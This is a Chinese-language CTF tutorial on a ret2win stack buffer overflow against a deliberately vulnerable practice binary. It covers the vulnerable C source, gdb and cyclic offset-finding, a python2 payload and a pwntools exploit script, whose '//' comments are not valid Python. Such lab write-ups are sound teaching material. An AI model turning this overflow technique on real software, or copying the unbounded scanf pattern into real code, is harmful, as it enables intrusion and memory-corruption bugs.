# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

# 获取文件信息
下载这个github库，进入03文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a9c4e1dc956a46e5bf6113fd26c56a2b.png)

使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/d97d24f7804e4eeea3037b3f80b2ffe7.png)

这也和上一个文件相似，从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用nx，nx：数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```

我们运行程序看看，他叫我们输入字符，我们随意输入即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/74116e8dc0af4aa8b5124516d9b564ff.png)

# 分析程序源代码
打开程序源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/24f14db039074401a7cc1183dbd4ba32.png)

```
#include <stdio.h>

void hacked()
{
    printf("This function is TOP SECRET! How did you get in here?! :O\n");   //成功破解的字符
}

void register_name()
{
    char buffer[16];    //定义了一个变量，名为buffer，有16个字节的缓冲区

    printf("Name:\n");   //输出字符"Name:
    scanf("%s", buffer);   //获取我们输入的字符，并存入到buffer变量里
    printf("Hi there, %s\n", buffer);     //输出字符Hi there和我们输入的变量
}

int main()
{
    register_name();   //调用上面的register_name自定义函数

    return 0;
}
```

可以看到，这题没有gets函数，也算是比较常见入门题，我们的目标就是让程序调用hacked自定义函数里的内容


# 覆盖程序函数的返回地址
## 动态调试

我们用gdb对程序进行动态调试
```
gdb ret2win
```
然后查看程序里调用的函数
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a58556ad8ee44ac3b41e254711801ef6.png)

然后查看主函数register_name的汇编代码
```
disassemble register_name
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2ab0a71b7c964584ba65fc9f7bc82e91.png)

输入命令cyclic就能获得测试用的字符串
```
cyclic 100
```
生成100个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符

![在这里插入图片描述](https://img-blog.csdnimg.cn/9e134eef646f4e4ea73085a9694cfd27.png)

复制这些字符，然后运行程序并输入

![在这里插入图片描述](https://img-blog.csdnimg.cn/b53f4c84acc3401e97b4877dfc0ab92c.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/958988a3b4534aa1a59b12265c4a171e.png)



可以看到，程序已经报错了，而且里面原本的参数全被我们输入的值给覆盖了，这里需要注意的是ret指令，ret是子程序的返回指令，原本他要返回main函数，结果被我们覆盖了，返回到了其他不存在的地址，于是程序就报错了

EIP这个寄存器，他是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行

可以看到，eip寄存器里的值是haaa的十六进制，我们查一下haaa在刚刚生成的字符的第几个
```
cyclic -l haaa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e3da16753c874a20b442bcbd7c52a550.png)


说明我们要覆盖eip原本的返回地址并控制，就需要28个字符+想让程序跳转执行的地址

然后我们再次查看程序调用的函数地址
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c82d634dceeb4e62b07d32e33cd98a2c.png)


hacked函数的地址为
```
0x08049182
```

知道了这些，现在我们就可以破解程序了，首先需要用python生成字符,还有一个知识点是在x86架构里，读取地址是由低到高的，十六进制0x08049182就要从最后一个开始写
```
python2 -c "print 'A'*28+'\x82\x91\x04\x08'"
```

然后将输出的值存放到一个文件里
```
python2 -c "print 'A'*28+'\x82\x91\x04\x08'" > exp
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/46fa65d5fdf64384a7993db9fe51ecb8.png)

然后运行程序，导入这个文件里的值

```
./ret2win < exp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7b100c87db4444aeaa3e8f4c3594bf67.png)

成功破解程序
## gdb调试
```
gdb ret2win
```

我们在主函数register_name最后一条汇编指令的地址下一个断点，来看看程序里都发生了什么
```
disassemble register_name
b *0x08049202
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f9b1ef1d64f84d5b878aec02891b28df.png)

导入我们刚刚存放字符的文件后直接运行
```
run < exp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7c744331379246918ef2b534ba7137a1.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c00073c72c12421d916c28acb9bf0c62.png)

可以看到，程序原本的值是main函数的地址然后退出程序，现在被我们覆盖成了hacked函数的地址，于是程序就返回到hacked地址执行指令
# pwntools脚本
```
from pwn import *   //导入pwntools模块

io = process('./ret2win')    //运行程序
io.sendline(b'A' * 28 + p32(0x08049182))   //程序运行后发送指定的字符串，格式为32位
print(io.recvall())   //接收输出
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/dd6423dd2f67446ab8646121e4384418.png)

成功破解程序
# 总结
有什么不会或者是错误的地方的可以私信我，看到必回
